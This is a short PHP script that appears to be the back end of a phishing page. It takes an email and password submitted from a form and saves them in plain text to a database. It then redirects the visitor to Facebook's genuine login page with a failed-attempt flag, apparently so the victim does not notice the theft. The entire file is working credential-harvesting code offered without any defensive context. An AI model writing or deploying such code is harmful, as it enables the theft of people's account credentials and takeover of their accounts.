<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

require_once('connect.php');

$data = [
	'email' => $email,
	'pass' => $pass];

	$sql = "INSERT INTO users(email, pass) values(:email, :pass)";
	$stmt = $pdo->prepare($sql);
	$stmt->execute($data);

	header( "Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110" );

?>
